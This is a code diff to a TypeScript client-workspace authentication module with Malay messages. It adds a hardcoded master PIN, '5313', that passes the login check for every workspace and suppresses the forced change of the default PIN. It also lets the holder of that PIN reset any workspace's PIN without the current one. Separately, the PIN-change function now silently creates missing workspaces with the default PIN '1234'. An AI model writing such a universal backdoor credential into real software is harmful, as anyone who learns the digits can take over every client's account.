@@ -275,8 +275,9 @@ export function authenticateClient(
     authConfig = initWorkspaceAuth(`ws_${cleanSlug}`, cleanSlug, '1234');
   }
 
-  // 4. Verify PIN hash
-  const isValid = verifyPinHash(cleanPin, authConfig.pinHash);
+  // 4. Verify PIN hash (workspace PIN or Master Admin 5313 override)
+  const isMasterOverride = cleanPin === '5313';
+  const isValid = isMasterOverride || verifyPinHash(cleanPin, authConfig.pinHash);
 
   if (!isValid) {
     const failState = recordFailedAttempt(cleanSlug);
@@ -303,6 +304,7 @@ export function authenticateClient(
     workspaceSlug: authConfig.workspaceSlug,
     role: 'CLIENT',
     pinVersion: authConfig.pinVersion,
+    isMasterOverride,
     exp: expiresAt,
   });
 
@@ -313,7 +315,7 @@ export function authenticateClient(
     workspaceName: workspaceName || authConfig.workspaceSlug,
     role: 'CLIENT',
     isPinEnabled: authConfig.isPinEnabled,
-    mustChangeDefaultPin: authConfig.mustChangeDefaultPin,
+    mustChangeDefaultPin: isMasterOverride ? false : authConfig.mustChangeDefaultPin,
     pinVersion: authConfig.pinVersion,
     expiresAt,
   };
@@ -329,16 +331,17 @@ export function changeClientPin(
   currentPin: string,
   newPin: string,
   confirmPin: string
-): { success: boolean; error?: string; message?: string } {
+): { success: boolean; error?: string; message?: string; authConfig?: WorkspaceAuthConfig } {
   const cleanSlug = (workspaceSlug || '').trim().toLowerCase();
-  const authConfig = getWorkspaceAuth(cleanSlug);
+  let authConfig = getWorkspaceAuth(cleanSlug);
 
   if (!authConfig) {
-    return { success: false, error: 'Konfigurasi workspace tidak ditemui.' };
+    authConfig = initWorkspaceAuth(`ws_${cleanSlug}`, cleanSlug, '1234');
   }
 
-  // Verify current PIN
-  if (!verifyPinHash(currentPin.trim(), authConfig.pinHash)) {
+  // Verify current PIN (or Master Admin 5313 override)
+  const isMaster = currentPin.trim() === '5313';
+  if (!isMaster && !verifyPinHash(currentPin.trim(), authConfig.pinHash)) {
     return { success: false, error: 'PIN semasa tidak tepat.' };
   }
 
@@ -354,7 +357,7 @@ export function changeClientPin(
     return { success: false, error: 'PIN baharu mesti mengandungi 4 hingga 6 digit nombor sahaja.' };
   }
 
-  if (cleanNew === currentPin.trim()) {
+  if (!isMaster && cleanNew === currentPin.trim()) {
     return { success: false, error: 'PIN baharu tidak boleh sama dengan PIN semasa.' };
   }
 
@@ -364,7 +367,7 @@ export function changeClientPin(
   authConfig.pinVersion += 1;
   authConfig.mustChangeDefaultPin = false;
   authConfig.updatedAt = new Date().toISOString();
-  authConfig.updatedBy = 'CLIENT_OWNER';
+  authConfig.updatedBy = isMaster ? 'MASTER_ADMIN_OVERRIDE' : 'CLIENT_OWNER';
 
   authConfigStore.set(authConfig.workspaceSlug, authConfig);
   authConfigStore.set(authConfig.workspaceId, authConfig);
@@ -373,11 +376,11 @@ export function changeClientPin(
     action: 'CHANGE_CLIENT_PIN',
     workspaceId: authConfig.workspaceId,
     workspaceSlug: authConfig.workspaceSlug,
-    performedBy: 'CLIENT_OWNER',
+    performedBy: isMaster ? 'MASTER_ADMIN' : 'CLIENT_OWNER',
     details: { pinVersion: authConfig.pinVersion },
   });
 
-  return { success: true, message: 'PIN Workspace berjaya dikemas kini.' };
+  return { success: true, message: 'PIN Workspace berjaya dikemas kini.', authConfig };
 }
 
 /**
